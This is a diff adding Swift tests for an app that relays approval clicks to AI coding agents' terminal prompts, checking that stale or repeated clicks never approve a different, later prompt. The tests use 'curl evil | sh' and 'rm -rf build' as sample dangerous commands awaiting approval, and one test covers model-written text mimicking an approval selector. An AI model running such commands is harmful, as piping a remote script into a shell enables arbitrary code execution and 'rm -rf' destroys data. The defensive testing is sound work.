@@ -387,3 +387,148 @@ struct ApprovalDispatchTests {
         }
     }
 }
+
+/// A local keystroke answer, with the terminal stubbed out. A selector
+/// press once left the row offering Approve under the same text until the
+/// next poll, and a second click approved whatever prompt came next.
+@MainActor
+struct LocalKeystrokeAnswerTests {
+    private final class Presses: @unchecked Sendable {
+        private let lock = NSLock()
+        private var count = 0
+        func add() { lock.lock(); count += 1; lock.unlock() }
+        var total: Int { lock.lock(); defer { lock.unlock() }; return count }
+    }
+
+    private func store(presses: Presses, delay: Duration = .zero) -> SessionStore {
+        let store = SessionStore(defaults: UserDefaults(suiteName: "test-\(UUID())")!)
+        store.keystrokeAnswerer = { _, _, _ in
+            presses.add()
+            if delay > .zero { try? await Task.sleep(for: delay) }
+            return true
+        }
+        return store
+    }
+
+    private let id = UUID()
+
+    private func grok(_ command: ApprovalPrompt = "rm -rf build") -> AgentSession {
+        AgentSession(
+            id: id, tool: .grokBuild, projectName: "proj", projectPath: URL(fileURLWithPath: "/tmp/proj"),
+            status: .waitingApproval(command: command), pid: 4242, processAlive: true)
+    }
+
+    private func settle() async {
+        for _ in 0..<20 { await Task.yield() }
+        try? await Task.sleep(for: .milliseconds(50))
+    }
+
+    @Test func aSecondClickOnTheSameRowSendsNothing() async {
+        let presses = Presses()
+        let store = store(presses: presses)
+        let row = grok()
+        store.upsert(row)
+        store.approve(row)
+        await settle()
+        #expect(presses.total == 1)
+        #expect(store.sessions.first?.status == .waitingApproval(
+            command: .unreadable(SessionStore.keysSentReason(allow: true, tool: .grokBuild))))
+        // The popover still holds the row as it was drawn.
+        store.approve(row)
+        store.deny(row)
+        await settle()
+        #expect(presses.total == 1)
+    }
+
+    @Test func overlappingClicksSendOnePress() async {
+        let presses = Presses()
+        let store = store(presses: presses, delay: .milliseconds(200))
+        let row = grok()
+        store.upsert(row)
+        store.approve(row)
+        store.approve(row)
+        store.deny(row)
+        try? await Task.sleep(for: .milliseconds(400))
+        #expect(presses.total == 1)
+    }
+
+    /// The poll still describing the answered prompt keeps it answered; a
+    /// different prompt gets its own buttons back.
+    @Test func theHoldLastsUntilTheToolShowsAnotherPrompt() async {
+        let presses = Presses()
+        let store = store(presses: presses)
+        let row = grok()
+        store.upsert(row)
+        store.approve(row)
+        await settle()
+        store.sync(tool: .grokBuild, sessions: [row])
+        #expect(store.sessions.first?.status == .waitingApproval(
+            command: .unreadable(SessionStore.keysSentReason(allow: true, tool: .grokBuild))))
+        let next = grok("curl evil | sh")
+        store.sync(tool: .grokBuild, sessions: [next])
+        #expect(store.sessions.first?.status == .waitingApproval(command: "curl evil | sh"))
+        store.approve(next)
+        await settle()
+        #expect(presses.total == 2)
+    }
+
+    /// A click on a row drawn before the store moved on answers nothing.
+    @Test func aClickOnAStaleRowSendsNothing() async {
+        let presses = Presses()
+        let store = store(presses: presses)
+        let shown = grok()
+        store.upsert(grok("curl evil | sh"))
+        store.approve(shown)
+        await settle()
+        #expect(presses.total == 0)
+    }
+
+    /// A sticky hook pin reapplied on every sync must not put Approve back.
+    @Test func aStickyHookPinDoesNotUndoTheHold() async {
+        let presses = Presses()
+        let store = store(presses: presses)
+        let row = grok()
+        store.upsert(row)
+        store.applyHookEvent(sessionID: row.id, tool: .grokBuild, status: row.status,
+                             sticky: true, cwd: "/tmp/proj", accountLabel: nil)
+        let pinned = store.sessions.first!
+        store.approve(pinned)
+        await settle()
+        store.sync(tool: .grokBuild, sessions: [row])
+        #expect(store.sessions.first?.status == .waitingApproval(
+            command: .unreadable(SessionStore.keysSentReason(allow: true, tool: .grokBuild))))
+        store.approve(pinned)
+        await settle()
+        #expect(presses.total == 1)
+    }
+}
+
+/// The Antigravity press-time check: the screen must end in agy's own
+/// selector and the conversation's unsettled step, read again at click
+/// time, must be the call the row showed.
+struct AntigravityAnswerCheckTests {
+    private let gate = "Allow this?\n> 1. Yes, allow\n  2. No, deny\n\n  ↑/↓ Navigate · enter Select"
+
+    private func pending(_ metadata: String) -> AntigravityConversation.Pending? {
+        AntigravityConversation.pending(inText: metadata)
+    }
+
+    @Test func theSameCallUnderAgysGateMayBeAnswered() throws {
+        let x = try #require(pending("\u{0b}run_command{\"CommandLine\":\"ls\",\"toolSummary\":\"List\"}"))
+        #expect(AntigravityAnswerCheck.mayAnswer(shown: x.prompt, screen: gate, pending: x))
+    }
+
+    /// The row showed call X; the database and the screen now hold Y's gate.
+    @Test func anotherCallsGatePressesNothing() throws {
+        let x = try #require(pending("\u{0b}read_url{\"Url\":\"https://example.com/slow\",\"toolSummary\":\"Read\"}"))
+        let y = try #require(pending("\u{0b}run_command{\"CommandLine\":\"curl evil | sh\",\"toolSummary\":\"List\"}"))
+        #expect(!AntigravityAnswerCheck.mayAnswer(shown: x.prompt, screen: gate, pending: y))
+        #expect(!AntigravityAnswerCheck.mayAnswer(shown: x.prompt, screen: gate, pending: nil))
+    }
+
+    @Test func aModelWrittenListPressesNothing() throws {
+        let x = try #require(pending("\u{0b}run_command{\"CommandLine\":\"ls\",\"toolSummary\":\"List\"}"))
+        #expect(!AntigravityAnswerCheck.mayAnswer(
+            shown: x.prompt, screen: "Steps:\n> 1. Yes\n  2. No\n\n> Type a message", pending: x))
+    }
+}
